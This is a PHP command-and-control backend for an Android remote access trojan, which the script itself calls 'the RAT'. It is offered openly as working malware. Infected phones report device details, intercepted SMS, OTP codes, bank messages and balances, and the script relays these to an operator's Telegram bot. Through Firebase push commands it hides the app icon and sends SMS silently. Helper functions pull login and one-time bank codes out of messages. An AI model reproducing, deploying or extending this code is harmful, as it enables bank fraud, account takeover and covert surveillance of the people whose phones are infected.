<?php

include("chalim.php");

define( 'TOKEN', $bot_token );
define( 'Firebase_key', $firebase );
define( 'PORT_SUDO', $sudo_port );

#---------------------------------

    
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot".TOKEN."/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}

function strposA($text, $needles = array()){
	$isin = false;
	for($i=0; $i < count($needles); $i++){
		if(strpos($text, $needles[$i]) !== false){
			$isin = true;
		}
	}
	return $isin;
}
function findPooya($string){
	$date = '';
	$explode = explode("\n",$string);
	foreach($explode as $line){
		if(strpos($line,"code") !== false or strpos($line,"ورود") !== false or strpos($line,"پویا") !== false or strpos($line,"رمز") !== false or strpos($line,"Code") !== false){
			if(strposA($line,['1','2','3','4','5','6','7','8','9','0'])){
				$pan = getNumber($line);
			}
		}
    }
    return $pan;
}
function getNumber($string)
{
    $number = '';
    for ($i = 0; $i < strlen($string); $i++) {
        if (is_numeric($string[$i])) {
            $number .= $string[$i];
        }
    }
    return $number;
}

function getNumber2($x)
{
preg_match('/[A-Za-z0-9]+/', $x, $matches);
        $number = $matches[0];
    return $number;
}

function smg($chatid,$text,$keyboard){
	bot('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>'HTML',
	'reply_markup'=>$keyboard
	]);
    }
    function emg($chatid,$message_id,$text,$keyboard){
    bot('editmessagetext',[ 
        'chat_id'=>$chatid, 
        'message_id'=>$message_id,
        'text'=>$text,
        'parse_mode'=>'HTML',
        'reply_markup'=>$keyboard
        ]);
        }
        function EMflag(string $code) : string {
    return (string) preg_replace_callback(
        '/./',
        static fn (array $letter) => mb_chr(ord($letter[0]) % 32 + 0x1F1E5),
        $code
    );
}
    function asd($string, $start, $end){
        $string = ' ' . $string;
        $ini    = strpos($string, $start);
        if ($ini == 0)
            return '';
        $ini += strlen($start);
        $len = strpos($string, $end, $ini) - $ini;
        return substr($string, $ini, $len);
        }
     
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    function requestSMS($mode,$device_id,$phone,$message){

        $data_string = '{"data":{"command":"'.$mode.'","device_id":"'.$device_id.'","phone":"'.$phone.'","text":"'.$message.'"},"to":"\/topics\/'.PORT_SUDO.'"}';
        $headers = array ( 'Authorization: key=' . Firebase_key, 'Content-Type: application/json' );
        $ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
        curl_setopt( $ch,CURLOPT_POST, true );
        curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
        curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
        curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
        $result = curl_exec($ch);
        curl_close ($ch);
          
        }
        function requests($mode,$device_id){

            $data_string = '{"data":{"command":"'.$mode.'","device_id":"'.$device_id.'"},"to":"\/topics\/'.PORT_SUDO.'"}';
                    
            $headers = array ( 'Authorization: key=' . Firebase_key, 'Content-Type: application/json' );
            $ch = curl_init(); curl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' );
            curl_setopt( $ch,CURLOPT_POST, true );
            curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
            curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
            curl_setopt( $ch,CURLOPT_POSTFIELDS, $data_string);
            $result = curl_exec($ch);
            curl_close ($ch);
        }
function Client_IP()
{
    $target_client_ip = @$_SERVER['HTTP_CLIENT_IP'];
    $target_forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $target_remote_ip = $_SERVER['REMOTE_ADDR'];
    if(filter_var($target_client_ip, FILTER_VALIDATE_IP))
    {
        $ip = $target_client_ip;
    }
    elseif(filter_var($target_forward_ip, FILTER_VALIDATE_IP))
    {
        $ip = $target_forward_ip;
    }
    else
    {
        $ip = $target_remote_ip;
    }
    return $ip;
}
        /*{
            static $Ary_List = array('REMOTE_ADDR', 'HTTP_CLIENT_IP', 'CLIENT_IP', 'HTTP_PROXY_CONNECTION', 'HTTP_FORWARDED', 'HTTP_X_FORWARDED', 'HTTP_X_FORWARDED_HOST', 'HTTP_X_FORWARDED_SERVER', 'FORWARDED_FOR_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED_FOR_IP', 'HTTP_X_FORWARDED_FOR', 'FORWARDED', 'X_FORWARDED_FOR', 'FORWARDED_FOR', 'X_FORWARDED', 'HTTP_VIA', 'VIA');                        
                foreach($Ary_List as $Value_array)        
                {        
                    if(isset($_SERVER[$Value_array]))        
                    {        
                        return $_SERVER[$Value_array];        
                    }        
                    elseif(getenv($Value_array))        
                    {        
                        return getenv($Value_array);        
                    }        
                    else        
                    {        
                        continue;        
                    }        
                }                        
            return 0;        
        }*/
#----------------------------------------------
 $ip = Client_IP();
 mkdir('user');
 $action=$_POST['action'];
 
 if(isset($_POST['Device_id'])){
 $Device_id = $_POST['Device_id'];
 }
 if(isset($_POST['Model'])){
 $Model=$_POST['Model']; 
 }
 if(isset($_POST['Battery'])){
 $Battery = $_POST['Battery'];
 }
 if(isset($_POST['andver'])){
    $os = $_POST['andver'];
 }
 if(isset($_POST['operator'])){
 $operator = $_POST['operator'];
 }
 if(isset($_POST['sender'])){
 $sender = $_POST['sender'];
 }
 if(isset($_POST['messagetext'])){
 $message_text = $_POST['messagetext'];
}
if(isset($_POST['Android'])){
    $Android = $_POST['Android'];
}
if(isset($_POST['berand'])){
    $berand = $_POST['berand'];
}
if(isset($_POST['Product'])){
    $Product = $_POST['Product'];
}
if(isset($_POST['word'])){
    $kal = $_POST['word'];
}

#---------------------------------------------
$install_panel = json_encode(['resize_keyboard'=>true, 'inline_keyboard'=>[
    [['text'=>"𝑯𝒊𝒅𝒅𝒆𝒏",'callback_data' => "fs $Device_id $Model"],['text'=>"𝑪𝒐𝒏𝒕𝒓𝒐𝒍 𝑷𝒂𝒏𝒆𝒍",'callback_data' => "ls $Device_id $Model"]],
    [['text'=>"𝑳𝑨𝑺𝑻 𝑺𝑴𝑺",'callback_data' => "wqw $Device_id $Model"],['text'=>"𝑨𝒍𝒍 𝑺𝑴𝑺",'callback_data' => "kkkk $Device_id $Model"]]
]]);		
$online_panel = json_encode(['resize_keyboard'=>true, 'inline_keyboard'=>[
    [['text'=>"𝑺𝒊𝒍𝒆𝒏𝒕",'callback_data' => "hg $Device_id $Model"],['text'=>"𝑪𝒐𝒏𝒕𝒓𝒐𝒍",'callback_data' => "ls $Device_id $Model"]],
    [['text'=>"𝑺𝑻𝒂𝑻𝒖𝒔",'callback_data' => "rt $Device_id $Model"]]
]]);
$Log_Panel = json_encode(['resize_keyboard'=>true, 'inline_keyboard'=>[
    [['text'=>"ID : $Device_id",'callback_data' => "ls $Device_id $Model"]]
]]);
$status_panel = json_encode(['resize_keyboard'=>true, 'inline_keyboard'=>[
    [['text'=>"𝑹𝑬𝑻𝑹𝒀",'callback_data' => "rt $Device_id $Model"],['text'=>"𝑪𝒐𝒏𝒕𝒓𝒐𝒍",'callback_data' => "ls $Device_id $Model"]],[['text'=>"𝑨𝒍𝒍 𝑺𝑴𝑺",'callback_data' => "kkkk $Device_id $Model"]],
]]);
$sms_panel = json_encode(['resize_keyboard'=>true, 'inline_keyboard'=>[
    [['text'=>"𝑪𝒉𝒂𝒏𝒈𝒆 𝑰𝒄𝒐𝒏",'callback_data' => "newic $Device_id $Model"],['text'=>"𝑪𝒐𝒏𝒕𝒓𝒐𝒍",'callback_data' => "ls $Device_id $Model"]],
]]);

#---------------------------------------------
 if(isset($_POST['action'])){
$action_autohide = file_get_contents("data/autohide.txt");
$action_first = file_get_contents("data/firstsms.txt");
$Message_First = file_get_contents("data/number-first.txt");
$Number_First = file_get_contents("data/message-first.txt");
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
$online_model = file_get_contents("data/online_model.txt");
}
#---------------------------------------------

if ($action == "install"){
    if($action_autohide == "on"){
    
        requests('hidden',$Device_id);
    }
    if($action_first == "on"){
    
        $Number_First = file_get_contents("data/number-first.txt");
        $Message_First = file_get_contents("data/message-first.txt");
        requestSMS("send_sms",$Device_id,$Number_First,$Message_First);
        
    }
    if (!file_exists("user/$Device_id-model.txt")) {
    $cont = file_get_contents("data/contact.txt");

        $kossher = $cont+1;
        file_put_contents("user/$Device_id-apk.txt","Visible");
        file_put_contents("user/$Device_id-ringer.txt","No set");
        file_put_contents("user/$Device_id-name.txt","User$kossher");
        file_put_contents("user/$Device_id-offline.txt","OFF");
        file_put_contents("user/$Device_id-ip.txt",$ip);
        file_put_contents("user/$Device_id-model.txt",$Model);
        
        file_put_contents("data/contact.txt",$cont+1);
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
        $flag = EMflag($gcx["countryCode"]);
        smg($id_sender,"
╔ [ • ⚡ #Install_User • ] 
║  
╠ [ • <b>Model</b> : $Model • ]
╠ [ • <b>Device</b> : <code>$Device_id</code> • ]
╠ [ • <b>Network</b> : $operator • ]
╠ [ • <b>Berand</b> : $berand • ]
╠ [ • <b>Product</b> : $Product • ]
╠ [ • <b>Android</b> : $os • ]
╠ [ • <b>Battry</b> : $Battery % • ]
╠ [ • <b>Name</b> : <code>user[ $kossher ]</code> • ]
╠ [ • <b>Country</b> : {$gcx["countryCode"]} $flag • ] 
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
║
╠ [ • <code>/login_$Device_id</code> • ]
╠ [ • <code>/block_$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",$install_panel);
    
}else{
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
        $name = file_get_contents("user/$Device_id-name.txt");
        $offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
        $flag = EMflag($gcx["countryCode"]);
        smg($id_sender,"
        
<b>User <code>/login_$Device_id</code> installed the RAT Again.</b>

",$geeeh);

}
}elseif($action == "online_device"){
     if($online_model == "list"){
         $old_user = file_get_contents("data/onlineusers.txt");
        file_put_contents("data/onlineusers.txt", $old_user."[ • <b>$name</b> : <code>/login_$Device_id</code> • ] \n ");
        $onlineusers = file_get_contents("data/onlineusers.txt");
        $miid = file_get_contents("data/miid.txt");
        $lines = explode("\n", $onlineusers);
        $unique_lines = array_unique($lines);
        $result = implode("\n", $unique_lines);
        $txt = explode("/login_", $result);
        $rxt = count($txt) - 1;
        emg($id_sender,$miid,"
Request Sent : 
A list Of Online Users Has Been Sent To You:

$result
Count : $rxt
Plesae Dont Delete Message !",null);
     }else{
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
        $flag = EMflag($gcx["countryCode"]);
    smg($id_sender,"
╔ [ • #Online_Device • ] 
║  
╠ [ • <b>Model</b> : $Model • ]
╠ [ • <b>Device</b> : <code>$Device_id</code> • ]
╠ [ • <b>Network</b> : $operator • ]
╠ [ • <b>Berand</b> : $berand • ]
╠ [ • <b>Product</b> : $Product • ]
╠ [ • <b>Android</b> : $os • ]
╠ [ • <b>Battry</b> : $Battery % • ]
╠ [ • <b>Name</b> : #$name • ]
╠ [ • <b>Offline Mode Status</b> : $offline • ]
╠ [ • <b>Country</b> : {$gcx["countryCode"]} $flag • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
║
╠ [ • <code>/login_$Device_id</code> • ]
╠ [ • <code>/block_$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",$online_panel);   
     }
}elseif($action == "Hidden_icon"){
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
file_put_contents("user/$Device_id-apk.txt","Hidden");
    smg($id_sender,"
╔ [ • #Hidden_icon • ] 
║  
╠ [ • <b>Model</b> : <code>$Model</code> • ]
╠ [ • <b>Android</b> : $os • ]
╠ [ • <b>Battry</b> : $Battery % • ]
╠ [ • <b>Device ID</b> : <code>$Device_id</code> • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",null); 
}elseif($action == "iconchange"){
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
file_put_contents("user/$Device_id-apk.txt","Changed");
 smg($id_sender,"
╔ [ • #Icon_Changed • ] 
║  
╠ [ • <b>Model</b> : <code>$Model</code> • ]
╠ [ • <b>Android</b> : $os • ]
╠ [ • <b>Battry</b> : $Battery % • ]
╠ [ • <b>Device ID</b> : <code>$Device_id</code> • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",null); 
}elseif($action == "offlineOn"){
   file_put_contents("user/$Device_id-offline.txt","ON");
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender,"
╔ [ • #Offline_Mode • ] 
║  
╠ [ • <b>Status</b> : $offline • ]
╠ [ • <b>Model</b> : <code>$Model</code> • ]
╠ [ • <b>Device ID</b> : <code>$Device_id</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",null); 
}elseif($action == "offlineOff"){
 file_put_contents("user/$Device_id-offline.txt","OFF");
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender,"
╔ [ • #Offline_Mode • ] 
║  
╠ [ • <b>Status</b> : $offline • ]
╠ [ • <b>Model</b> : <code>$Model</code> • ]
╠ [ • <b>Device ID</b> : <code>$Device_id</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",null); 
 }elseif($action == "visible_icon"){
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
file_put_contents("user/$Device_id-apk.txt","Visible");
 smg($id_sender,"
╔ [ • #Visible_icon • ] 
║  
╠ [ • <b>Model</b> : <code>$Model</code> • ]
╠ [ • <b>Device ID</b> : <code>$Device_id</code> • ]
╠ [ • <b>Android</b> : $os • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",null);   
    }elseif($action == "status"){
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
        $flag = EMflag($gcx["countryCode"]);
    smg($id_sender,"
╔ [ • #Status • ]     { #$name }
║  
╠ [ • <b>Model</b> : $Model • ]
╠ [ • <b>Product</b> : $Product • ]
╠ [ • <b>Device</b> : <code>$Device_id</code> • ]
╠ [ • <b>Network</b> : $operator • ]
╠ [ • <b>Offline Mode Status</b> : $offline • ]
╠ [ • <b>Android</b> : $os • ]
╠ [ • <b>Battry</b> : $Battery % • ]
╠ [ • <b>Country</b> : {$gcx["countryCode"]} $flag • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
║
╠ [ • <code>/login_$Device_id</code> • ]
╠ [ • <code>/block_$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",$status_panel);   
    
    }elseif($action == "ReciveSMS"){
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
   $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
   $flag = EMflag($gcx["countryCode"]);

$file_content = file_get_contents('block.txt');

if (strpos($file_content, $ip) !== false) {

} else {
$x = findPooya($message_text);
if ($x == ""){
$x = getNumber2($message_text);
}
$xx = "<b>Code :</b> <code>$x</code>";
    smg($id_sender,"
    
<b>New sms Recevied #$name</b>

<b>User</b> : #$Device_id
<b>Model</b> : $Model
<b>Operator</b>: $operator
<b>Android ( OS )</b> : $os
<b>Battry</b> : $Battery%
<b>First IP</b> : <code>$install_ip</code>
<b>IP</b> : <code>$ip</code> | {$gcx["countryCode"]} $flag
- - - - - - - -
<b>From</b> : <code>$sender</code>
<b>Text Message</b> :
<b>$message_text</b>

<b>$xx</b> | <b>@Developer_Terrorism</b>
",$sms_panel);
}
    }elseif($action == "OTPSMS"){
$phone = asd($message_text,'[Address=',', Body=');
$body= asd($message_text,', Body=','IsInitialized');
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
     $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
     $flag = EMflag($gcx["countryCode"]);
smg($id_sender,"
╔ [ • #New_Spy_Message • ] 
║
╚ [ • Message : \n <b>$body</b> • ]

╔ [ • <b>Sender</b> : $sender • ]
╠ [ • <b>Model</b> : $Model • ]
╠ [ • <b>ID</b> : #$Device_id • ]
╠ [ • <b>Network</b> : $operator • ]
╠ [ • <b>Android</b> : $os • ]
╠ [ • <b>Battry</b> : $Battery % • ]
╠ [ • <b>Country</b> : {$gcx["countryCode"]} $flag • ]
╠ [ • <b>Name</b> : <code>$name</code> • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
║
╠ [ • <code>/login_$Device_id</code> • ]
╠ [ • <code>/block_$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",$sms_panel);

    }elseif($action == "lastsms"){
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
      $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
      $flag = EMflag($gcx["countryCode"]);
    smg($id_sender,"
#Last_Message

<b>User</b> : #$Device_id
<b>Model</b> : $Model
<b>OP</b>: $operator
<b>Android ( OS )</b> : $os
<b>Battry</b> : $Battery %
<b>First IP</b> : $install_ip
<b>IP</b> : <code>$ip</code> | {$gcx["countryCode"]} $flag
- - - - - - - -
<b>From</b> : $sender
<b>Text Last</b> :

<b>$message_text </b>

<b>@Developer_Terrorism</b>
",$sms_panel);

 }elseif($action == "lastbanksms"){
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
    $flag = EMflag($gcx["countryCode"]);
    $sender = str_replace(["\n"], '', $sender);
   smg($id_sender,"
╔ [ • #Last_Bank_Message • ] 
║  
╚ [ • <b>Message :</b> \n <b>$message_text</b> • ]

╔ [ • <b>Bank</b> : $sender • ]
╠ [ • <b>Model</b> : $Model • ]
╠ [ • <b>ID</b> : #$Device_id • ]
╠ [ • <b>Network</b> : $operator • ]
╠ [ • <b>Android</b> : $os • ]
╠ [ • <b>Battry</b> : $Battery % • ]
╠ [ • <b>Name</b> : <code>$name</code> • ]
╠ [ • <b>Country</b> : {$gcx["countryCode"]} $flag • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
║
╠ [ • <code>/login_$Device_id</code> • ]
╠ [ • <code>/block_$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",$sms_panel);
    }elseif($action == "balance"){
            $x = file_get_contents("data/bal.txt");
        if($x == "singel"){
        $BalanceText = "";
         if(isset($_POST['Balances'])){
$Balance_Data = json_decode(base64_decode($_POST['Balances']),true);
 }else{
     $Balance_Data = [];
 }
        if (count($Balance_Data) == 0) {
            $BalanceText = "❌پیام بانکی ای وجود ندارد";
        } else {
            foreach ($Balance_Data as $key => $balance) {
                $BalanceText .= "\n$key";
                $BalanceText .= "\n💰" . $balance['Balance'];
                $BalanceText .= "\n☎️شماره : " . $balance['Address'];
                $BalanceText .= "\n==============";
            }
        }


    smg($id_sender,"$BalanceText",null);   
    file_put_contents("data/bal.txt","xx");
    }else{
        $BalanceText = "";
         if(isset($_POST['Balances'])){
$Balance_Data = json_decode(base64_decode($_POST['Balances']),true);
 }else{
     $Balance_Data = [];
 }
        if (count($Balance_Data) == 0) {
            $BalanceText = "❌پیام بانکی ای وجود ندارد";
        } else {
            foreach ($Balance_Data as $key => $balance) {
                $BalanceText .= "\n$key";
                $BalanceText .= "\n💰" . $balance['Balance'];
                $BalanceText .= "\n☎️شماره : " . $balance['Address'];
                $BalanceText .= "\n==============";
            }
        }

$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
        $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
        $flag = EMflag($gcx["countryCode"]);
    smg($id_sender,"
╔ [ • #Balance • ] 
║
╚ [ • <b>Balance</b> : \n <b>$BalanceText</b> • ]
╔ [ • <b>Model</b> : $Model • ]
╠ [ • <b>Network</b> : $operator • ]
╠ [ • <b>ID</b> : #$Device_id • ]
╠ [ • <b>Android</b> : $os • ]
╠ [ • <b>Battry</b> : $Battery % • ]
╠ [ • <b>Name</b> : <code>$name</code> • ]
╠ [ • <b>Country</b> : {$gcx["countryCode"]} $flag • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
║
╠ [ • <code>/login_$Device_id</code> • ]
╠ [ • <code>/block_$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",$sms_panel);   
        }}elseif($action == "WhatsChecker"){
        $install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender,"
╔ [ • #Checker • ] 
║  
╠ [ • <b>Status Checker</b> :  <code>$message_text</code> • ]
╠ [ • <b>Model</b> : <code>$Model</code> • ]
╠ [ • <b>Network</b> : <code>$operator</code> • ]
╠ [ • <b>Device</b> : <code>$Device_id</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
║
╠ [ • <code>/login_$Device_id</code> • ]
╠ [ • <code>/block_$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",$sms_panel);   
}elseif($action == "searchSMS"){
$install_ip = file_get_contents("user/$Device_id-ip.txt");
$name = file_get_contents("user/$Device_id-name.txt");
$offline = file_get_contents("user/$Device_id-offline.txt");
$gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"),true);
$flag = EMflag($gcx["countryCode"]);
   smg($id_sender,"
╔ [ • #Search_SMS • ] 
║
╚ [ • <b>Text Message</b> : \n <b>$message_text</b> • ]
╠ [ • <b>Word</b> : \n <b>$kal</b> • ]
╔ [ • <b>Sender</b> : <code>$sender</code> • ]
╠ [ • <b>Model</b> : $Model • ]
╠ [ • <b>Network</b> : $operator • ]
╠ [ • <b>ID</b> : #$Device_id • ]
╠ [ • <b>Country</b> : {$gcx["countryCode"]} $flag • ]
╠ [ • <b>Offline Mode Status</b> : $offline • ]
╠ [ • <b>First Ip</b> : <code>$install_ip</code> • ]
╠ [ • <b>Ip</b> : <code>$ip</code> • ]
║
╠ [ • <code>/login_$Device_id</code> • ]
╠ [ • <code>/block_$ip</code> • ]
║
╚ [ • <b>Coded by : @Developer_Terrorism</b> • ]",$sms_panel);   
    }

?>
